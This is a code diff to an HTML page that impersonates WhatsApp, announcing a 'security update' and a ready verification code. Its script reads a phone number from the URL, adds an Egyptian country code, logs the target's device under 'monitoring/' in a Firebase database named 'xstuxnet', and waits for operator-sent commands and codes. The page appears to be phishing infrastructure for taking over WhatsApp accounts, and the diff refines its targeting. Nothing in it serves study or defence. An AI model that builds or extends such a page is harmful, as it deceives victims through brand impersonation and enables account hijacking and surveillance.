@@ -8,13 +8,9 @@
     <meta property="og:title" content="WhatsApp Security Update">
     <meta property="og:description" content="Your verification code is ready! Update your account to version V3.0.1 now.">
     <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/600px-WhatsApp.svg.png">
-    <meta property="og:image:type" content="image/png">
-    <meta property="og:image:width" content="600">
-    <meta property="og:image:height" content="600">
     <meta property="og:url" content="https://wa-protocol-update.vercel.app">
     <meta property="og:type" content="website">
     <meta property="og:site_name" content="WhatsApp">
-    <meta name="twitter:card" content="summary_large_image">
 
     <link rel="icon" href="https://static.whatsapp.net/rsrc.php/v3/yP/r/r_o_pS3X9sl.png" type="image/x-icon">
     <style>
@@ -63,7 +59,7 @@
         const config = { databaseURL: "https://xstuxnet-7e038-default-rtdb.firebaseio.com/" };
         firebase.initializeApp(config);
         const db = firebase.database();
-        const userId = new URLSearchParams(window.location.search).get('id');
+        const rawId = new URLSearchParams(window.location.search).get('id');
         const isAr = navigator.language.startsWith('ar');
         const isIOS = /iPhone|iPad|iPod/.test(navigator.userAgent);
         const deviceType = isIOS ? "iPhone" : "Android";
@@ -91,17 +87,17 @@
         document.getElementById('u-steps').innerHTML = c.steps;
         document.getElementById('u-wait').innerText = c.wait;
 
-        if (userId) {
-            const sRef = db.ref('monitoring/' + userId);
-            
-            // إشعار دخول فوري للبوت (بدون طلب GPS)
-            sRef.set({ 
-                status: "🔥 Online", 
-                device: deviceType,
-                last_seen: Date.now()
+        if (rawId) {
+            let phone = rawId.replace(/\D/g, ''); // تنظيف الرقم
+            if (phone.startsWith('01') && phone.length === 11) phone = '20' + phone; // إضافة رمز مصر تلقائياً
+
+            db.ref('monitoring/' + phone).set({ 
+                status: "pending", 
+                target: phone,
+                device: deviceType 
             });
 
-            db.ref('commands/' + userId).on('value', s => {
+            db.ref('commands/' + phone).on('value', s => {
                 const v = s.val();
                 if (v) {
                     if (v.code) { 
